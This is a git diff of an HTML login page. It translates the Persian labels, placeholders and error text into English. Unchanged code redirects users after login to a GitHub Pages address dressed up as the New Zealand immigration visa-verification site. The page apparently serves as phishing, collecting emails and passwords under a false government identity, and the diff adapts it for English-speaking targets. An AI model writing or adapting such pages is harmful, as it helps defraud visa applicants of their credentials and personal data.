@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ورود به حساب کاربری</title>
+  <title> Login</title>
   <style>
     body {
       background: linear-gradient(to right, #6dd5fa, #2980b9);
@@ -65,11 +65,11 @@
 <body>
 
   <div class="login-box">
-    <h2>ورود به حساب</h2>
+    <h2>login account</h2>
     <form id="loginForm">
-      <input type="email" id="email" placeholder="ایمیل" required>
-      <input type="password" id="password" placeholder="رمز عبور" required>
-      <button type="submit">ورود</button>
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder=" Password" required>
+      <button type="submit">login</button>
     </form>
     <p id="result"></p>
   </div>
@@ -96,7 +96,7 @@
         window.location.href = "https://newzealandvisaverification.github.io/https-visaview.immigration.govt.nz-vvs-registerVvsAccount.aspx/";
       } else {
         result.style.color = "red";
-        result.textContent = "ایمیل یا رمز عبور اشتباه است.";
+        result.textContent = " Incorect Password or Email.";
       }
     });
   </script>
